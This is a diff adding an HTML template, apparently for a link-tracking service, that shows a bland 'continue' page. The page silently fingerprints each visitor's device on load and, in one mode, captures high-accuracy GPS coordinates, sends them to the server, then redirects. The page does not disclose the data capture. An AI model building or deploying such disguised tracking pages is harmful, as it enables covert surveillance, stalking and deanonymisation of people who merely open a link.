@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ link.name }}</title>
+<style>
+body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;
+  display:flex;min-height:100vh;align-items:center;justify-content:center}
+.wrap{text-align:center;padding:24px;max-width:420px}
+h1{font-size:18px;margin:0 0 8px}
+p{color:#9aa3b2;font-size:13px;margin:0 0 20px}
+button{padding:12px 32px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;color:#fff}
+.tiny{font-size:11px;color:#5f6875;margin-top:18px}
+a{color:#4c8dff}
+</style></head><body>
+<div class="wrap">
+  <h1>{{ link.name }}</h1>
+  <p>{{ link.note or "続けるを押してください" }}</p>
+  <button id="go">続ける</button>
+  <p class="tiny" id="st"></p>
+</div>
+<script>
+const CODE = {{ code|tojson }};
+const HIT  = {{ hit_id }};
+const DEST = {{ dest|tojson }};
+const MODE = {{ link.mode|tojson }};
+const payload = {};
+function collect(){
+  payload.screen = innerWidth + "x" + innerHeight + "@" + (devicePixelRatio||1);
+  try{ payload.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ""; }catch(e){}
+  payload.platform = navigator.platform || "";
+  payload.cores = navigator.hardwareConcurrency || 0;
+  payload.mem = navigator.deviceMemory || 0;
+  payload.touch = ('ontouchstart' in window) ? 1 : 0;
+}
+function send(cb){
+  collect();
+  const body = JSON.stringify(Object.assign({hit_id:HIT}, payload));
+  const done = ()=>{ cb && cb(); };
+  try{
+    fetch("/l/"+CODE+"/x", {method:"POST", headers:{"Content-Type":"application/json"},
+      body:body, keepalive:true}).then(done).catch(done);
+  }catch(e){ done(); }
+}
+function go(){
+  if(DEST){ location.href = DEST; }
+  else { document.getElementById("st").textContent = "記録しました"; }
+}
+document.getElementById("go").addEventListener("click", function(){
+  const st = document.getElementById("st");
+  if(MODE === "geo" && navigator.geolocation){
+    st.textContent = "位置情報を確認しています…";
+    navigator.geolocation.getCurrentPosition(function(p){
+      payload.gps_lat = p.coords.latitude;
+      payload.gps_lon = p.coords.longitude;
+      payload.gps_acc = p.coords.accuracy;
+      send(go);
+    }, function(){ send(go); }, {enableHighAccuracy:true, timeout:8000, maximumAge:0});
+  } else {
+    send(go);
+  }
+});
+send(null);
+</script>
+</body></html>
